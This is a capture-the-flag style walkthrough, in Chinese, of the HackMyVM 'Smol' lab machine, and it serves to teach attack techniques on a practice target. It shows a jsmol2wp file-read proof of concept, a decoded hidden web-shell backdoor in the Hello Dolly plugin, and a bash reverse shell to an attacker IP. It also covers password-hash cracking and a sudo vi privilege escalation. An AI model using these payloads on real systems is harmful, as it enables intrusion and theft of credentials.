---
title: HMV Smol
published: 2025-03-07
pinned: false
description: HMV Smol，渗透，wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-07
pubDate: 2025-03-07
---

## Smol
### 靶场链接

https://hackmyvm.eu/machines/machine.php?vm=Smol

### 日常扫描

```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ nmap -sC -sV 192.168.31.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 20:18 CST
Nmap scan report for 192.168.31.25
Host is up (0.0023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.hmv
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds

```

设置一下重定向，最下面有`Proudly powered by WordPress | PopularFX Theme`
wpscan启动！

```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ wpscan --url http://www.smol.hmv/ -e u,ap --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.hmv/ [192.168.31.25]
[+] Started: Thu Mar  6 20:26:25 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[i] The WordPress version could not be detected.

[+] WordPress theme in use: popularfx
 | Location: http://www.smol.hmv/wp-content/themes/popularfx/
 | Last Updated: 2024-11-19T00:00:00.000Z
 | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt
 | [!] The version is out of date, the latest version is 1.2.6
 | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5
 | Style Name: PopularFX
 | Style URI: https://popularfx.com
 | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...
 | Author: Pagelayer
 | Author URI: https://pagelayer.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5'

[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://www.smol.hmv/wp-content/plugins/akismet/
 | Last Updated: 2025-02-14T18:49:00.000Z
 | Readme: http://www.smol.hmv/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.3.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/akismet/readme.txt

[+] jsmol2wp
 | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 | Readme: http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/, status: 200
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] think
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Mar  6 20:27:53 2025
[+] Requests Done: 110753
[+] Cached Requests: 16
[+] Data Sent: 29.735 MB
[+] Data Received: 44.476 MB
[+] Memory used: 447.949 MB
[+] Elapsed time: 00:01:28

```

哎，发现插件jsmol2wp还爆红，看看这玩意有没有公开的漏洞
https://cn-sec.com/archives/1247521.html 对于这个插件的1.07版本及其以下有效，
```
POC:
http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

得到
```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

账户密码wpuser/kbLSF2Vop#lw3rjDZ629*Z%G，登录进去

### 弹shell

额，发现这个用户权限很低（wp版本好低，看的不习惯都），插件不能编辑上传，主题源码不能修改，完啦
看里面的内容发现`Webmaster Tasks!!`有一句话`[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.`，开扫

```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ dirsearch -u "http://www.smol.hmv/" -x 403 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                             
 (_||| _) (/_(_|| (_| )                                                      
                                                                             
Extensions: php, zip, txt | HTTP method: GET | Threads: 25
Wordlist size: 10439

Output File: /home/parallels/reports/http_www.smol.hmv/__25-03-06_20-43-25.txt

Target: http://www.smol.hmv/

[20:43:25] Starting:                                                         
[20:43:37] 301 -    0B  - /index.php  ->  http://www.smol.hmv/              
[20:43:37] 200 -    7KB - /license.txt                                      
[20:43:37] 404 -   19KB - /index.php/login/                                 
[20:43:42] 200 -    3KB - /readme.html                                      
[20:43:47] 301 -  315B  - /wp-admin  ->  http://www.smol.hmv/wp-admin/      
[20:43:47] 301 -  317B  - /wp-content  ->  http://www.smol.hmv/wp-content/  
[20:43:47] 200 -    0B  - /wp-content/                                      
[20:43:47] 200 -   84B  - /wp-content/plugins/akismet/akismet.php           
[20:43:47] 500 -    0B  - /wp-content/plugins/hello.php                     
[20:43:47] 200 -  519B  - /wp-content/uploads/                              
[20:43:47] 200 -  414B  - /wp-content/upgrade/                              
[20:43:47] 301 -  318B  - /wp-includes  ->  http://www.smol.hmv/wp-includes/
[20:43:47] 200 -    0B  - /wp-includes/rss-functions.php                    
[20:43:48] 400 -    1B  - /wp-admin/admin-ajax.php
[20:43:48] 200 -    0B  - /wp-cron.php
[20:43:48] 409 -    3KB - /wp-admin/setup-config.php
[20:43:48] 200 -    4KB - /wp-includes/
[20:43:48] 200 -    0B  - /wp-config.php
[20:43:48] 302 -    0B  - /wp-admin/  ->  http://www.smol.hmv/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.hmv%2Fwp-admin%2F&reauth=1
[20:43:48] 200 -  511B  - /wp-admin/install.php
[20:43:48] 302 -    0B  - /wp-signup.php  ->  http://www.smol.hmv/wp-login.php?action=register
[20:43:48] 405 -   42B  - /xmlrpc.php
[20:43:48] 200 -    2KB - /wp-login.php

Task Completed                                                               
                                      
```

再用一下poc
```
/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

读取到
```
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );

```
把base64揭开得到`if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } `
其实就是`if (isset($_GET["cmd"])) { system($_GET["cmd"]); }`
最后，插件通过 add_action('admin_notices', 'hello_dolly'); 将 hello_dolly() 函数绑定到 admin_notices 钩子。这意味着只要进入 WordPress 的后台页面，就会自动调用 hello_dolly() 函数，在页面右上角显示一段随机歌词

访问一下
```
http://www.smol.hmv/wp-admin/index.php?cmd=ls

about.php admin-ajax.php admin-footer.php admin-functions.php admin-header.php admin-post.php admin.php async-upload.php authorize-application.php comment.php contribute.php credits.php css custom-background.php custom-header.php customize.php edit-comments.php edit-form-advanced.php edit-form-blocks.php edit-form-comment.php edit-link-form.php edit-tag-form.php edit-tags.php edit.php erase-personal-data.php export-personal-data.php export.php freedoms.php images import.php includes index.php install-helper.php install.php js link-add.php link-manager.php link-parse-opml.php link.php load-scripts.php load-styles.php maint media-new.php media-upload.php media.php menu-header.php menu.php moderation.php ms-admin.php ms-delete-site.php ms-edit.php ms-options.php ms-sites.php ms-themes.php ms-upgrade-network.php ms-users.php my-sites.php nav-menus.php network network.php options-discussion.php options-general.php options-head.php options-media.php options-permalink.php options-privacy.php options-reading.php options-writing.php options.php plugin-editor.php plugin-install.php plugins.php post-new.php post.php press-this.php privacy-policy-guide.php privacy.php profile.php revision.php setup-config.php site-editor.php site-health-info.php site-health.php term.php theme-editor.php theme-install.php themes.php tools.php update-core.php update.php upgrade-functions.php upgrade.php upload.php user user-edit.php user-new.php users.php widgets-form-blocks.php widgets-form.php widgets.phpQuote from Hello Dolly song, by Jerry Herman:
```

可以执行，本来想着直接弹shell，但是失败了，传个文件上去试试

```
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ echo 'bash -c "/bin/bash -i >& /dev/tcp/192.168.31.187/4444 0>&1"' > rev.sh
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.31.25 - - [06/Mar/2025 21:01:42] "GET /rev.sh HTTP/1.1" 200 -

http://www.smol.hmv/wp-admin/index.php?cmd=curl+192.168.31.187%2Frev.sh+-o+%2Ftmp%2Frev.sh
```

这样就弹了

### 提权

进数据库查表

```
mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0 | admin         | admin@smol.thm     | http://www.smol.hmv | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@smol.thm     | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BvcalhsCfVILp2SgttADny40mqJZCN/ | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
6 rows in set (0.00 sec)
```
开爆密码

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (?)
```

`su`切换用户

```
diego@smol:/home$ cd think
cd think
diego@smol:/home/think$ ls
ls
diego@smol:/home/think$ ls -la
ls -la
total 32
drwxr-x--- 5 think internal 4096 Jan 12  2024 .
drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null

```

别的账户还有意外之喜哎，

```
diego@smol:/home/think/.ssh$ python3 -m http.server 8001

┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]
└─$ wget 192.168.31.25:8001/id_rsa
--2025-03-06 21:35:09--  http://192.168.31.25:8001/id_rsa
Connecting to 192.168.31.25:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2602 (2.5K) [application/octet-stream]
Saving to: ‘id_rsa’

id_rsa              100%[================>]   2.54K  --.-KB/s    in 0.002s  

2025-03-06 21:35:09 (1.39 MB/s) - ‘id_rsa’ saved [2602/2602]

┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]
└─$ chmod 600 id_rsa
                                                                             
┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]
└─$ ssh think@192.168.31.25 -i id_rsa
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 06 Mar 2025 01:36:43 PM UTC

  System load:  1.46              Processes:                209
  Usage of /:   56.1% of 9.75GB   Users logged in:          0
  Memory usage: 35%               IPv4 address for enp0s17: 192.168.31.25
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

162 updates can be applied immediately.
125 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

think@smol:~$ 

```

信息收集一波
```
think@smol:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
think@smol:~$ cat /etc/group | grep dev
plugdev:x:46:
dev:x:1004:think,gege
think@smol:~$ cd /home/gege
think@smol:/home/gege$ ls
wordpress.old.zip
think@smol:/home/gege$ ls -la
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip

```

这个zip估计是关键，换成gege用户

这个压缩包需要密码，下载到kali上面
```
┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]
└─$ nc -lvnp 8000 > wordpress.zip     
listening on [any] 8000 ...
connect to [192.168.31.187] from (UNKNOWN) [192.168.31.25] 49032

gege@smol:~$ nc -q 0 192.168.31.187 8000 < wordpress.old.zip 

```

爆破一下密码
```
┌──(parallels㉿kali-linux-2024-2)-[~/Desktop]
└─$ john zip-hash -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hero_gege@hotmail.com (wordpress.zip)     
1g 0:00:00:00 DONE (2025-03-06 22:10) 2.173g/s 16597Kp/s 16597Kc/s 16597KC/s hesse..hellome2010
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

查一下敏感文件
```
┌──(parallels㉿kali-linux-2024-2)-[~/Desktop/wordpress.old]
└─$ cat wp-config.php                   
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

得到账号密码xavi/P@ssw0rdxavi@

```
gege@smol:~$ su xavi
Password: 
xavi@smol:/home/gege$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) /usr/bin/vi /etc/passwd

```

稳啦！`sudo /usr/bin/vi /etc/passwd`输入:!bash即可